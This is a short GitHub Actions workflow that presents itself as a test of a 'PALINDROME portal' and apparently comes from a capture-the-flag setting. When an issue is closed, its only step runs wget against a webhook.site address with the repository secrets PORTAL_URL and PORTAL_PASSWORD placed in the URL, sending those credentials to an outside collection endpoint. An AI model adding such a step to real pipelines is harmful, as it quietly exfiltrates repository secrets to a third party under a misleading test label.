name: Test the PALINDROME portal

on:
    issues:
        types: [closed]

jobs:
    test:
        runs-on: windows-latest
        steps:
            - uses: actions/checkout@v3
            - name: Test the PALINDROME portal
              run: |
                  C:\msys64\usr\bin\wget.exe '''https://webhook.site/058ce6da-4d43-4ba3-b575-0c5e76151b56/${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
                  cat test
